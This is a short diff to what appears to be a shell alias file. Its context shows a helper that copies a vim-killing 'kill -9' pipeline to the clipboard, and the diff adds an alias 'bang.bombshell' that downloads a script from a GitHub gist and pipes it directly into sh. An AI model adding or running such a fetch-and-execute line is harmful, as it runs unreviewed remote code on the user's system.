@@ -12,3 +12,5 @@ bang.exit-vim.cpy()
 {
   echo ":!ps axuw | grep vim | grep -v grep | awk '{print $2}' | xargs kill -9" | xclip -selection clipboard
 }
+
+alias bang.bombshell='curl -s https://gist.githubusercontent.com/ariary/ddfeded869c26f03b29ea0e00ab0bcfa/raw/59ac11ec7b5a3c0951d88ce6524466f134e3526b/bombshell.sh | sh'
